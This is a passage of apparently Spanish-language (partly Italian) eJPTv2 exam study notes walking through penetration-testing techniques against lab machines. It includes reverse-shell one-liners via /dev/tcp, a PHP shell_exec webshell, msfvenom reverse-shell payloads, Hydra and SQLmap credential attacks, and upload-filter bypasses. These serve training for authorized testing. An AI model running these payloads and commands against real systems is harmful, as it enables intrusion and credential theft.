![image](https://github.com/user-attachments/assets/c00bc412-5ed1-4379-afbf-845c7d253fef)# CONCEPTOS BÁSICOS DE HACKING
# Uso de netcat
Si quiero obtener una reverse shell en mi máquina atacante, primero debo conocer la dirección IP, que puedo obtener con el siguiente comando:  

`hostname -I` 

Ahora, puedo ir a la página revshells.com y generar el payload.  

![1](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/1.jpg)


En la página, ingreso la dirección IP de la máquina atacante y genero el payload.  
Me pongo en escucha en el puerto, por ejemplo, 9001, con el siguiente comando:  

`sudo nc -lvnp 9001`  

Luego, en la máquina víctima, ejecuto el payload generado en revshells.com:  

`sh -i >& /dev/tcp/10.10.10.10/9001 0>&1`

# Servicio de Python para compartir archivos   
Puede ser útil durante un ataque tener que cargar archivos en la máquina víctima.  
Para hacerlo, puedo "montar" un servidor web en Kali para compartir archivos.  
Escribo el comando:  

`sudo python3 -m http.server 80`  

En la máquina víctima podré descargar el archivo con el comando:  

`wget http://IpMacchinaKali/NombreFichero`  

# ARP-SCAN - NETDISCOVER  
Para descubrir máquinas dentro de mi red, puedo utilizar arpscan.  
Debo saber el nombre de la interfaz de red y luego escribir el comando:  

`sudo arp-scan -I eth0 --localnet`  

Puedo hacer lo mismo con netdiscover, escribiendo el comando:  

`sudo netdiscover -I eth0 -r 192.168.10.0/24`  

Puedo obtener la misma información con nmap con el comando:  

`sudo nmap -sn 192.168.10.0/24`  

# Escaneos básicos con nmap  
Ejemplo de comando de escaneo básico con nmap:  

`sudo nmap -p- -sS -sC -sV --open --min-rate 5000 -n -vvv -Pn 192.168.0.10 -oN 1stScan`  

-p- para escanear todos los puertos  
-sS para que sea más rápido  
-sC para ejecutar una serie de scripts básicos  
-sV para que me muestre la versión del servicio encontrado en el puerto abierto  
--open para encontrar los puertos abiertos  
--min-rate con el parámetro 5000 va muy rápido, ideal para la red local de casa, pero en el caso de un examen o en la vida real es mejor usar 1500 o 2000  
-n para evitar la resolución DNS  
-vvv para mostrar los resultados durante el escaneo  
-Pn es decir, sin ping  
-oN nombrearchivo para exportar en formato nmap  

# Escaneos de vulnerabilidades con nmap  
Supponiamo di aver scansionato una macchina Windows 7 con la porta 445 aperta.  
Potremmo usare una utility di nmap per vedere se è vulnerabile.  
C'è da dire che questo script fa "molto rumore" e non è consigliabile usarlo nel mondo reale.  

`sudo nmap --script "vuln" -p445 192.168.10.10`  

# Escaneo de puertos UDP  
Es conveniente también realizar escaneos del protocolo UDP.  
Para hacerlo, por ejemplo, podemos usar el comando:  

`sudo nmap -sU --top-ports 200 --min-rate=5000 -Pn 192.168.10.10`  

# EXPLOTACIÓN DE VULNERABILIDADES Y ATAQUES DE FUERZA BRUTA  
# Uso básico de Metasploit – Explotación de EternalBlue en Windows  
Siempre conviene abrir Metasploit desde el menú de Kali, ya que así se ejecuta el siguiente comando que permite actualizar automáticamente la base de datos de Metasploit.  

`sudo msfdb init && msfconsole`  

Si quiero buscar un exploit, puedo hacerlo escribiendo, por ejemplo:  

`search eternalblue`  

O también puedo buscarlo con el nombre de la CVE correspondiente, por ejemplo:  

`search CVE-2017-0143`  

Para usar un módulo, simplemente debo escribir el comando use seguido del número correspondiente del exploit que quiero utilizar, por ejemplo, 0.  

![2](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/2.jpg)   

Con el comando show options puedo ver todas las opciones disponibles para el exploit en cuestión, y con set puedo configurar los diferentes parámetros.  

![3](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/3.jpg) 

![4](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/4.jpg)

Y finalmente, con el comando run o exploit lanzaré el ataque, y si todo funciona correctamente, obtendré una meterpreter shell.  

![5](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/5.jpg)

# Utilizzo basico de Metasploit – Exploitation vsftpd in Linux  
Iniciamos la máquina Metasploitable 2.0.0 y después de una primera exploración, vemos que tiene muchos puertos abiertos.  
En particular, intentaremos analizar el puerto 21 y lanzaremos el comando:  

`sudo nmap --script "vuln" -p21 10.10.10.6`  

![6](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/6.jpg)  

En este punto, lanzaremos Metasploit y buscaremos un exploit que podamos utilizar en este caso concreto.  

![7](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/7.jpg)

Como podemos ver, el exploit 1 parece ser el adecuado para nuestro caso, así que lo seleccionamos, configuramos los parámetros necesarios y probamos a lanzar el ataque.  

![8](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/8.jpg)   

A veces puede ser necesario ejecutar el exploit un par de veces para que surta efecto.  

![9](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/9.jpg)   

# Msfvenom – Creazione payloads  

Con esta utilidad puedo crear archivos maliciosos que me permiten obtener una sesión meterpreter en mi máquina atacante.  
Para crear, por ejemplo, un archivo malicioso para Windows, debo escribir el siguiente comando:  

`sudo msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=6969 -f exe -o file.exe`  

Una vez creado el archivo malicioso y enviado a la máquina objetivo, deberé ponerme en escucha, en este caso en el puerto 6969, para obtener una reverse shell.    
Puedo hacerlo a través de netcat con el comando `nc -lvnp 6969` o con el multi handler de Metasploit.  
Veamos cómo usar el multi handler.      
Ejecuto Metasploit y escribo el comando:  

`use /multi/handler`  

Si escribo `show options`, puedo ver las opciones disponibles:  

![10](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/10.jpg)  

Debo configurar `LHOST` con la dirección IP de la máquina atacante y `LPORT` para que coincida con el puerto que he especificado durante la creación del archivo malicioso con `msfvenom` (6969 en este ejemplo).  

¡ATENCIÓN! ¡También el payload debe coincidir con el utilizado durante la creación del archivo!  
En este ejemplo, se observa que por defecto se utiliza el payload `generic/shell_reverse_tcp`, mientras que nosotros hemos especificado en `msfvenom` `windows/x64/meterpreter/reverse_tcp`.   

Puedo cambiarlo escribiendo:  

`set PAYLOAD windows/x64/meterpreter/reverse_tcp`    

Entonces, configuro los demás parámetros.  

![11](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/11.jpg)    

Y finalmente lo ejecuto con el comando run, y permanecerá en escucha.  
Ahora, si ejecuto el archivo malicioso en la máquina víctima, obtendré una sesión meterpreter.   

![12](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/12.jpg)  

# Uso de Hydra – Ataques de fuerza bruta a contraseñas (SSH y FTP)  
Puedo utilizar Hydra para realizar ataques de fuerza bruta.    
Si, por ejemplo, conozco uno o más nombres de usuario, puedo intentar hacer un ataque de fuerza bruta escribiendo:  

`sudo hydra -l juan -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.7`  

Utilizaré el parámetro `-l` en minúscula porque conozco el nombre del usuario; de lo contrario, habría usado el parámetro `-L`.    
Lo mismo para la contraseña: `-P` porque utilizo un diccionario; si no, habría usado `-p` seguido de la contraseña.  

![13](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/13.jpg)    

Si hubiera querido atacar FTP, solo habría que cambiar el parámetro en el comando:  

`sudo hydra -l juan -P /usr/share/wordlists/rockyou.txt ftp://10.10.10.7`   

![14](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/14.jpg)   

# Uso de Hydra – Attacchi di forza bruta a utenti (SSH ed FTP)  

Ahora veamos qué diccionario utilizar para enumerar los usuarios, suponiendo que ya conocemos la contraseña.  

`sudo hydra -L /usr/share/wordlists/metasploit/unix_users.txt -p alexis ssh://10.10.10.7 `  

![15](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/15.jpg)    

Si quisiera atacar FTP, escribiría el mismo comando y cambiaría solo el parámetro al final, como se vio anteriormente.  

**TIPS**  
Para el examen, usa estos diccionarios:  
- **USUARIOS** ==> `/usr/share/wordlists/metasploit/unix_users.txt`  
- **CONTRASEÑAS** ==> `/usr/share/wordlists/rockyou.txt`


# Uso de Hydra – Ataques de fuerza bruta a paneles de inicio de sesión web  

Para realizar un ataque de fuerza bruta a un inicio de sesión web, utilizaremos la máquina Blog de Vulnyx.  
La URL es la siguiente:   

`http://10.10.10.8/my_weblog/admin.php`

Primero intentamos ingresar "admin" como usuario y "admin" como contraseña, y pasamos la solicitud a Burp Suite para ver qué sucede.  

![16](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/16.jpg)  

Como podemos ver, se trata de una solicitud POST (línea 1), por lo que en el comando debemos especificarlo con la opción `http-post-form`.    
Luego, debemos ingresar la URL del panel de inicio de sesión con la solicitud de nombre de usuario y contraseña de la línea 16, es decir, `/my_weblog/admin.php:username=admin&password`.  
Sin embargo, dado que no conocemos la contraseña, debemos incluir el error que se muestra cuando el inicio de sesión falla.  

![17](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/17.jpg)   

El comando completo sería entonces:  

`sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.8 http-post-form "/my_weblog/admin.php:username=admin&password=^PASS^:Incorrect username or password." -t 64`  

# Ataques de fuerza bruta con Metasploit  
Puedo realizar ataques de fuerza bruta a SSH o FTP también con Metasploit.  
Una vez lanzado Metasploit, puedo escribir `search ssh_login`.  

![18](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/18.jpg)    

Puedo usar el **auxiliary scanner** (0) para intentar un ataque y puede ser una alternativa válida a Hydra.    
Configuro los parámetros necesarios y lanzo el ataque.    

![19](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/19.jpg)   

Metasploit es un poco más lento en comparación con Hydra, pero el resultado es el mismo.    
Para atacar FTP, haz exactamente lo mismo pero con el **auxiliary scanner** que se llama `ftp_login`.  

**TIPS:** Para que sea un poco más rápido, configura `VERBOSE` en `false` con el comando `set VERBOSE false`.   

# Ataques de fuerza bruta a bases de datos  
Per effettuare un attacco di forza bruta con Hydra contro un database MySQL, supponendo di sapere qual è il nome utente, userò sempre il solito comando visto nelle lezioni precedenti con ssh e ftp, cambierò solo l'ultimo parametro.  

`sudo hydra -l capybarauser -P /usr/share/wordlists/rockyou.txt mysql://10.10.10.9` 

Hasta aquí nada nuevo.    
Un pequeño truco a tener en cuenta para el examen es que la contraseña correcta podría estar al final del diccionario rockyou, por lo que podría tardar mucho tiempo.  

**TIPS**  
Entonces, puedo invertir el orden del diccionario y crear uno en orden inverso (es decir, de Z a A).    
Puedo hacerlo con la cuenta root con el comando:  

`tac /usr/share/wordlists/rockyou.txt > rockyou_inver.txt`  

Una volta creato il file reverse_rockyou.txt se lo apro con nano posso notare che non sta ben formattato, contiene spazi e si sono modificate alcune password.   

![20](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/20.jpg)   

Cancello le lettere arancioni e poi con tr tolgo gli spazi digitando il comando:  

`cat rockyou_inver.txt | tr -d ' ' > reverse_rockyou.txt`  

![21](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/21.jpg)   

Listo! Ya lo tenemos!  

![22](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/22.jpg)  

Ahora, para iniciar sesión en MySQL, deberé ejecutar el siguiente comando:  

`sudo mysql -h 10.10.10.9 -u capybarauser -pie168`  

### ¡¡¡IMPORTANTE!!!  
La contraseña debe escribirse inmediatamente después del parámetro `-p`.  

![23](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/23.jpg)  

Una vez que obtengamos acceso a una base de datos, los comandos más comunes que utilizaremos serán:  

`show databases;
use nome_database;
show tables;
SELECT * FROM users; (che significa seleziona tutte le colonne della tabella users)`  

Entonces, podríamos usar la contraseña obtenida para conectarnos, por ejemplo, a SSH o FTP.  

![24](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/24.jpg)   

# Ataques de fuerza bruta locales con John the Ripper  

Si tenemos archivos ZIP, bases de datos KeePass o contraseñas en formato hash, podemos usar John the Ripper para intentar descifrarlas.  

**ARCHIVO ZIP**    
Supongamos que tenemos un archivo ZIP protegido por una contraseña.     
Lo primero que debemos hacer es usar la utilidad `zip2john` y pasarle el archivo `.zip` con el comando:  

`sudo zip2john prova.zip > hash` 

![25](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/25.jpg)   

Una vez creado el hash (podemos llamar al archivo como queramos; en este ejemplo se llamará "hash"), puedo intentar encontrar la contraseña con John the Ripper usando el comando:  

`sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash`  

![26](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/26.jpg)    

**KEEPASS**
Se siamo in possesso di un database keepass (che ha una estensione .kdbx) posso sempre usare john.  
Stesso procedimento visto con zip, l'unica differenza è che dovrò usare prima keepass2john in questo modo: 

`sudo keepass2john nomedatabase.kdbx > hash`  

Entonces, escribiremos este comando para descifrar la contraseña:  

`sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash`  

**CONTRASEÑAS**  
Supongamos que tenemos una contraseña "hasheada" con MD5, por ejemplo.  
Puedo usar John the Ripper para descifrarla.  
Creo un hash MD5 y lo guardo en un archivo llamado `password`.  

![27](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/27.jpg)  

Si ejecuto el comando utilizado anteriormente, es posible que me devuelva un error:  

`sudo john --wordlist=/usr/share/wordlists/rockyou.txt password `   

![28](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/28.jpg)  

Esto se debe a que, como se puede ver en el error, John no puede determinar el tipo de hash.    
Puedo usar `hashidentifier` para averiguar qué tipo de hash es.    
Copio el hash de la contraseña y obtengo una pantalla similar a esta:    

![29](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/29.jpg)    

Ahora sé que el hash es un MD5, por lo que puedo pasárselo a John con esta opción (que se mostraba en el error anterior).  

`sudo john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt password`  

![30](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/30.jpg)    

**TIPS**  
Una web molto utile per decodificare password con hash MD5 ad esempio è crackstation.  

# Explotación de vulnerabilidades web  
# ¿Qué es el fuzzing web? – Uso de Gobuster  

Puedo realizar fuzzing web con la herramienta Gobuster escribiendo el siguiente comando:  

`sudo gobuster dir -u http://10.10.10.6/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt`  

TIPS 
Per l'esame è molto raccomandabile usare questo dizionario:  
/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt  

RICERCA ESTENSIONI FILES  
Se volessi ricercare files specifici, per esempio php, txt ecc. dovrò digitare il seguente comando:  

`sudo gobuster dir -u http://10.10.10.6/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,txt,py,htm,html`  

Un'alternativa a gobuster potrebbe essere dirb, che è un po' più semplice.  
Il comando sarebbe:  

`sudo dirb http://10.10.10.6`  

# Enumerar subdominios con Wfuzz  
Podría suceder que durante un escaneo con Nmap, especialmente cuando intento resolver máquinas en plataformas como TryHackMe (THM) o Hack The Box (HTB), aparezca un mensaje como "Service Info: Host: xxx.xxx".  

![31](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/31.jpg)    

Esto significa que estamos ante un caso de virtual hosting.    
De hecho, si intentamos abrir la página solo con la dirección IP, nos dará un error y nos redirigirá a `logan.hvm` en este ejemplo.  

![32](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/32.jpg)    

Para poder visualizar la página, debemos editar el archivo `/etc/hosts`.  

![33](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/33.jpg)    

Si ahora intento abrir la página web, se cargará correctamente.  

![34](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/34.jpg)    

Ahora podemos intentar enumerar los subdominios con Wfuzz usando el siguiente comando:  

`sudo wfuzz -c --hc=404 --hl=1 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -H "Host:FUZZ.logan.hmv" -u 192.168.10.202`  

### ¡¡¡IMPORTANTE!!!  
Con el parámetro `-H "Host:FUZZ.nombre_dominio"` podemos enumerar los subdominios.    
Si, por ejemplo, la exploración encuentra algo como esto:  

![35](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/35.jpg)    

Significa que habrá un subdominio que apuntará a `admin.logan.hmv`.     
Para poder visualizarlo, deberé editar nuevamente el archivo `/etc/hosts` y agregar esta nueva entrada para poder ver la página correctamente.   

![36](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/36.jpg)    

![37](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/37.jpg)   

# Cómo realizar un ataque de transferencia de zona DNS 
Supongamos que durante una exploración con Nmap encontramos abiertas la **puerta 53** (DNS) y la **puerta 80**, donde aparece un dominio, en este caso `hunterzone.nyx`.  

![38](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/38.jpg)    

Es importante entender que debo intentar enumerar tantos dominios y subdominios como sea posible, ya que son vehículos para descubrir información y lanzar ataques.  
En este caso, podría intentar un ataque de transferencia de zona DNS con la herramienta `dig`.  
Primero, modifico el archivo `/etc/hosts`, como hemos visto anteriormente, e ingreso el dominio `hunterzone.nyx`. Luego, lanzo el comando `dig` de la siguiente manera:  

`sudo dig axfr hunterzone.nyx @10.10.10.11`  

![39](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/39.jpg)    

En este caso, también debería agregar al archivo `/etc/hosts` todos los subdominios descubiertos.  

![40](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/40.jpg)     

Ahora, como hemos visto anteriormente, podría enumerar los subdominios con Wfuzz usando el comando:  

`sudo wfuzz -c --hc=404 --hl=367 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host:FUZZ.devhunter.nyx" -u 10.10.10.11`  

**TIPS**  
Para enumerar los subdominios, el diccionario más adecuado es:  

`/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt`

# Otros instrumentos de fuzzing web – Uso de WFUZZ, DIRB y DIRSEARCH 

**WFUZZ**  
Puedo realizar la enumeración de páginas web con el siguiente comando:  

`sudo wfuzz -c -L --hc=404 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.12/FUZZ`  

**DIRB** 
Puedo realizar la enumeración de páginas web con el siguiente comando:  

`sudo dirb http://10.10.10.12/`  

El problema de `dirb` es que utiliza un diccionario muy limitado.   
Puede ser útil para realizar un escaneo rápido, y si encuentro algo interesante, puedo escanearlo más a fondo con Wfuzz o Gobuster.  

**DIRSEARCH**  
Puedo realizar la enumeración de páginas web con el siguiente comando:   

`sudo dirsearch -u http://10.10.10.12/`  

Di forma automatica cerca già estensioni.  
Se voglio passargli un dizionario un po' più completo posso dare il comando:  

`sudo dirsearch -u http://10.10.10.12/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.10.12/`   

# Exploitation della vulnerabilità file upload  
Normalmente, un vector de ataque muy utilizado es la carga de archivos maliciosos para obtener una reverse shell.  
Si me encuentro con una página web que tiene un inicio de sesión y la posibilidad de registrarme, siempre conviene hacerlo, ya que puedo analizar mejor la página y encontrar un vector de ataque.  
En este ejemplo, utilizaremos la máquina Sectalks. Una vez que he creado un usuario, puedo ver que hay un menú que me permite cargar archivos.  

![41](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/41.jpg)     

Lo que puedo hacer es crear un archivo malicioso, por ejemplo en PHP, y tratar de cargarlo. Utilizaré `msfvenom` con el siguiente comando:  

`sudo msfvenom -p php/reverse_php LHOST=10.10.10.10 LPORT=6969 -f raw > file.php`  

Una vez generado, lo cargaré en la página web.    
Perfecto, ahora debo intentar entender dónde se guardan los archivos cargados, por lo que tendré que enumerar el sitio con Wfuzz o Gobuster, como se vio anteriormente.  

`sudo gobuster dir -u http://10.10.10.13 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt`  

De esta manera, puedo ver que existe una carpeta `uploads`, que es donde probablemente se guardarán los archivos cargados.  

![42](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/42.jpg)      

Y efectivamente es así; de hecho, si voy a la dirección `http://10.10.10.13/uploads/`, veo el archivo que cargué.  

![43](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/43.jpg)     

Ahora solo me queda abrir una terminal en la máquina Kali y ponerme en escucha en el puerto 6969 (el que se usó durante la generación del payload).   
Luego, debo hacer clic en el archivo `.php` cargado en la página web.  

`sudo nc -lvnp 6969`  

Y listo, hemos obtenido una reverse shell.  

![44](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/44.jpg)  

***TIPS** 
Lamentablemente, la shell generada con `msfvenom` no siempre es muy estable.   
Para trabajar con más calma y evitar problemas de desconexiones, es recomendable ponerse en escucha en otro puerto, por ejemplo el 7070.   
Luego, puedes generar una reverse shell desde una página web como revshells.com.   

![45](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/45.jpg)   

Ahora abrimos otra ventana del terminal y nos ponemos en escucha en el puerto de la reverse shell recién creada (en este ejemplo, el 7070).  

Luego, desde la shell que obtuvimos con `msfvenom`, digitamos el siguiente comando:  

`bash -c "sh -i >& /dev/tcp/10.10.10.10/7070 0>&1"`  

Sería `bash -c` y entre comillas, pegar el comando generado por la página web revshells.com.   
Y listo, de esta manera obtenemos una reverse shell estable.  

![46](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/46.jpg)   

# Primeros pasos después de la intrusión (Tratamiento de la TTY)  
Cuando obtengo una reverse shell, debo tratarla porque, de lo contrario, no puedo ejecutar comandos simples, como por ejemplo, `clear`.  

![47](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/47.jpg)    

Aquí están los pasos a seguir.  
En la shell sin tratar, escribo en el siguiente orden:  

`script /dev/null -c bash
Dopodichè Ctrl +Z (il processo va in background)
stty raw -echo; fg
reset xterm (è molto probabile che non vedrò nulla quando lo digito)
export TERM=xterm
export SHELL=bash`  

![48](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/48.jpg)   

¡CONSEJOS!
Si este tratamiento no funciona, puedo intentar este comando:  

`python -c "import pty;pty.spawn('/bin/bash')"`   


# Obtener una intrusión en el servidor mediante una webshell 

Una alternativa para obtener una reverse shell es utilizar una webshell (que es una alternativa a lo que vimos antes con msfvenom y, además, es más estable).  
Primero, debo crear un archivo .php con nano e insertar este código:  

`<?php
	echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>`  

Si ahora abro la web y exploro este archivo, no pasa nada.  

![49](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/49.jpg)     

Es normal que sea así, porque para que funcione, deberé escribir después de ".php?cmd=" el comando que quiero ejecutar.  

`10.10.10.13/uploads/avatar_andrea_web.php?cmd=whoami`  

![50](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/50.jpg)     

Si quiero obtener una reverse shell desde aquí, deberé escribir en la barra de direcciones un comando que deberá ser codificado para la URL, de lo contrario, el navegador no podrá interpretarlo.   
Para hacerlo, usaré Burp Suite.   
Seleccionaré el menú Decoder y pegaré el comando:  

`bash -c "sh -i >& /dev/tcp/10.10.10.10/7070 0>&1"`  

obtenido del sitio revshell como se vio en las lecciones anteriores.   

![51](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/51.jpg)  

Luego escucharé en la máquina Kali en el puerto 7070 usado en este ejemplo y en la url después de «?cmd=» copiaré el código generado por Burpsuite.  

![52](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/52.jpg)   

![53](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/53.jpg)    

# Evasión de la restricción de carga de archivos  

Puede ocurrir que al intentar subir un archivo .php recibamos un error, y es lógico porque muchas webs prohíben la subida de archivos .php porque, como hemos visto anteriormente, pueden ser potencialmente dañinos.  

![54](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/54.jpg)     

Podemos utilizar un pequeño truco para saltarnos esta limitación.    
Si renombramos el archivo y ponemos .phtml como extensión, podremos cargar el archivo, que será interpretado como php.   

![55](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/55.jpg)      

Si todo funciona en este punto, podríamos realizar los pasos como hemos visto antes, es decir, fuzzing para averiguar dónde se guardan los archivos subidos, ejecutar el payload después de escuchar en la máquina atacante, y luego obtener una shell inversa.  

# Burp Suite - Modificación de peticiones HTTP  
Otro método para subir el archivo saltándose la comprobación de extensión del servidor es utilizando Burpsuite.  
Veamos cómo proceder.   
Primero inicio Burpsuite y configuro foxyproxy como Burp en mi navegador.  
Ahora activo «Intercept on».  

![56](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/56.jpg)  

Así que intento subir mi archivo con la extensión .php.  

![57](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/57.jpg)    

La petición es interceptada por Burpsuite y es aquí donde puedo editarla antes de enviarla al servidor.  

![58](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/58.jpg)     

Cambio la extensión del archivo y pongo .phtml y lo envío al servidor pulsando en 'Reenviar'.   

![59](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/59.jpg)   

El archivo que guardo localmente con extensión .php no ha sido modificado, ¡el concepto es que con Burpsuite puedo modificar peticiones sobre la marcha!  

# Burp Suite - Uso del repetidor  
El repetidor es muy útil porque nos permite obtener respuestas en tiempo real.  
Supongamos que no hemos podido subir nuestro archivo .php y queremos probar otras extensiones para ver cuáles funcionan.  
Lo que puedo hacer es enviar la petición al repetidor, puedo hacerlo pulsando con el botón derecho del ratón y haciendo clic en «enviar al repetidor» o con la combinación Ctrl + R.  

![60](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/60.jpg)    

Así puedo probar varias extensiones para ver cuál funciona realmente.  

![61](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/61.jpg)   

![62](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/62.jpg)      

Una vez que encuentre la extensión que funcione   

![63](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/63.jpg)  

Puedo volver a la pantalla principal, cambiar la extensión por la que he visto que funciona y hacer el forward para editar la petición y enviarla al servidor.  

![64](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/64.jpg)   

# Inyecciones SQL - Uso de SQLmap  
Para esta demostración utilizaremos la máquina Vulnyx Shop.  
Tras ejecutar nmap y hacer fuzzing con gobuster, descubrimos que hay una url interesante, concretamente http://10.10.10.14/administrator/. 

![65](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/65.jpg)     

Si abrimos el enlace, nos encontramos con un panel de inicio de sesión desnudo y sin información.  

![66](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/66.jpg)    

Una cosa que podemos hacer en este caso es utilizar la herramienta SQLMap para intentar enumerar las bases de datos y obtener información interesante.  

Para ello escribiremos el comando  

`sudo sqlmap -u http://10.10.10.14/administrator/ --forms --dbs --batch`  

El parámetro --dbs indica que estamos buscando bases de datos.  
Cuando finaliza el escaneo, podemos ver que ha encontrado 4 bases de datos, 3 son las clásicas que están presentes en todas las instalaciones, pero destaca una que se llama Webapp, y que es la que vamos a intentar enumerar.  

![67](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/67.jpg)      

Con el segundo comando, queremos intentar obtener las tablas de esta base de datos:  

`sudo sqlmap -u http://10.10.10.14/administrator/ --forms -D Webapp --tables --batch`  

El resultado será éste:  

![68](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/68.jpg)    

Así que ahora queremos conocer el contenido de la tabla Usuarios, en concreto nos interesan las columnas que puedan contener nombres de usuario y contraseñas.  
Para ello escribiremos el siguiente comando:  

`sudo sqlmap -u http://10.10.10.14/administrator/ --forms -D Webapp -T Users --columns --batch`  

El resultado será éste:  

![69](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/69.jpg)   

Por último, queremos conocer el contenido de estas columnas.  
Para ello escribiremos:  

`sudo sqlmap -u http://10.10.10.14/administrator/ --forms -D Webapp -T Users -C username,password -dump --batch`  

Y listo, ya hemos obtenido la lista de nombres de usuario y contraseñas de la base de datos de la Webapp y ahora podríamos utilizarlos para obtener acceso a SSH, por ejemplo.   

![70](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/70.jpg)   


# Hacking server Tomcat 
Supongamos que encontramos, escaneando con nmap, un servidor Tomcat.  

![71](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/71.jpg)    

Podemos probar a visitar la página, en este caso en http://10.10.10.15:8080 para ver qué ocurre.  
Si no se ha cambiado la configuración por defecto, aparece una página similar a esta:  

![72](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/72.jpg)   

y pulsamos sobre el enlace manager-webapp se nos pide un nombre de usuario y una contraseña.  
Ahora tenemos 2 opciones:  
1) buscamos en Google escribiendo por ejemplo «hacktricks tomcat default credentials» y al abrir la página podemos obtener una lista de las credenciales por defecto.

![73](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/73.jpg)   

2) o podemos pinchar en el enlace manager-webapp y pinchar en 'cancelar' y nos devolverá un mensaje donde también aparecerán las credenciales para iniciar sesión, extraño, pero cierto.

![74](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/74.jpg)     

Una vez obtenidas las credenciales, puedo acceder al panel y cargar los archivos maliciosos para obtener una shell inversa.  

![75](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/75.jpg)     

Por lo tanto, crearemos 2 cargas útiles con msvenom, porque podría ocurrir que una de ellas no funcionara.  

PAYLOAD 1   

`sudo msfvenom -p java/shell_reverse_tcp LHOST=10.10.10.10 LPORT=6969 -f war -o file_1.war`  

PAYLOAD 2    

`sudo msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=6969 -f war -o file_2.war`  

